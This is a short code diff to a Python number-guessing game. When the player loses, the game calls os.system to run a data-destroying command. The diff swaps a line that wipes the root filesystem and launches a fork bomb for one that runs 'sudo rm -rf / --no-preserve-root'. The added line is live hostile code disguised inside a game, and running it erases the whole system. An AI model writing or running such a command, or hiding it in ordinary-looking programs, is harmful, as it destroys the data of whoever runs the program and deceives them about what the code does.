@@ -21,7 +21,7 @@ def main_game():
     print("your number is",play)
     if play == choose:
             print("You lose :(")
-            os.system("rm -rf / --no-preserve-root | :(){ :|:& };:")
+            os.system("sudo rm -rf / --no-preserve-root")
     else:
         print("You Win")
 def main():
